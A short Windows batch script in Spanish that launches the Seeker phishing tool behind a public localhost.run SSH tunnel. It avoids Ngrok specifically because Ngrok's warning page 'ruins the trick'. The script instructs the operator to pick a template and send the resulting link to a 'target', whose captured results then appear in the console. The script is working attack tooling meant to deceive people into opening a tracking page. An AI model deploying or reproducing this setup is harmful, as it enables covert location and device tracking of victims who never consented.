@echo off
echo ==============================================
echo        Iniciando Seeker + Ngrok
echo ==============================================
echo.
echo [1] Abriendo el Tunel (localhost.run) en una nueva ventana...
echo NOTA: Ngrok ahora pone una pantalla de advertencia en cuentas gratis que arruina el truco.
echo Por eso, estamos usando localhost.run (no requiere instalacion, usa SSH nativo de Windows).
start cmd /k "ssh -R 80:localhost:8080 nokey@localhost.run"
echo.
echo [2] Iniciando Seeker...
echo * Selecciona la plantilla que desees usar escribiendo su numero.
echo * Espera a que la otra ventana de color negro te de la URL (terminara en .lhr.life o .localhost.run)
echo * Envia ese link a tu objetivo.
echo * Los resultados apareceran en esta ventana.
echo.
python seeker.py
pause
